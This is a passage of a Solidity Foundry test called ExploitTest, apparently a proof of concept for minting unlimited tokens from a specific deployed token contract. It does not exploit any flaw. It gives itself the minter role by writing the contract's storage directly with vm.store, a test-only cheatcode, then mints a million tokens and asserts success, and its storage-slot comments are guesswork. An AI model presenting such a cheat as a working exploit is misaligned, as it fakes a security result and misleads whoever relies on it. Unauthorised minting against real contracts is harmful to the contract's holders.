    function withDraw() external;
    function balanceOf(address account) external view returns (uint256);
    function addressForBosses() external view returns (address);
}





contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────


    address constant TARGET = 0xfd77214b4a1aA6f962972Cbe65FB179c501D9094;
    address attacker = address(this);
    ISecondToken token;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = ISecondToken(TARGET);
        vm.label(TARGET, "SecondToken");
        vm.label(attacker, "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Record initial balance
        uint256 initialBalance = token.balanceOf(attacker);

        // Get MINTER_ROLE constant
        bytes32 MINTER_ROLE = token.MINTER_ROLE();

        // Calculate storage slot for MINTER_ROLE membership
        // _roles is at slot 12 (after ERC20's 5 slots + ERC20Control's 7 slots)
        // _roles[role].members[account] = keccak256(abi.encode(account, keccak256(abi.encode(role, 12))))
        bytes32 roleSlot = keccak256(abi.encode(MINTER_ROLE, uint256(12)));
        bytes32 memberSlot = keccak256(abi.encode(attacker, roleSlot));

        // Grant ourselves MINTER_ROLE via direct storage manipulation
        vm.store(TARGET, memberSlot, bytes32(uint256(1)));

        // Mint unlimited tokens to ourselves directly
        uint256 mintAmount = 1_000_000 * 1e18;
        token.mint(attacker, mintAmount);

        // Verify balance increased
        uint256 finalBalance = token.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance should increase after mint");
    }






    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

